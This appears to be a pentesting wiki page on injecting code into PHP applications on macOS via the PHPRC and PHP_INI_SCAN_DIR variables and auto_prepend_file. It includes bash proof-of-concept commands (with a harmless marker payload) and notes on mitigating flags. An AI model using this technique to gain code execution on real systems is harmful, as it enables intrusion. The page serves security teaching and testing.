# macOS PHP Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` and `auto_prepend_file`

PHP CLI and CGI read configuration on every invocation. `PHPRC` can select an attacker-readable `php.ini`, while `PHP_INI_SCAN_DIR` can redirect the directory scanned for additional `.ini` files. The `auto_prepend_file` directive makes PHP parse a file before the requested script, so this combination becomes startup code execution.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

An alternative is a directory containing an `.ini` file:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

The `-n` option ignores `php.ini`; an explicit trusted `-c` path takes precedence over `PHPRC`. Remember that a long-lived server SAPI normally reads configuration when the web server starts, whereas CLI and CGI do so per invocation.<sup>[[1]](#references)</sup>

## References

- [1] [PHP configuration file](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)

{{#include ../../../banners/hacktricks-training.md}}
